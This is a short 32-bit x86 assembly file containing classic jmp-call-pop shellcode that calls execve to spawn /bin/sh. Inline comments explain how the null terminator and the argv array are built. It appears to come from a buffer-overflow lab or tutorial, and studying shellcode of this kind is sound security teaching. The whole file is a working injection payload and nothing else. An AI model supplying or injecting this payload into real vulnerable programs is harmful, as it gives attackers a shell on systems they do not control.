section .text
  global _start
    _start:
	BITS 32
	jmp short two
    one:
		pop ebx
		xor eax, eax
		mov [ebx+7], al		; Add \0 to the end of the string "\bin\sh"
		mov [ebx+8], ebx  	; Construct argv[] and push the address of ebx (AAAA) to argv[0]
		mov [ebx+12], eax	; Add 0 to argv[1] (BBBB)
		lea ecx, [ebx+8] 	; set ecx to the address of argv[]
		
		; For environment variables
		xor edx, edx		; No environment variables
		
		; Invoke execve()
		mov al,  0x0b		
		int 0x80
    two:
		call one
		db '/bin/sh*AAAABBBB' 
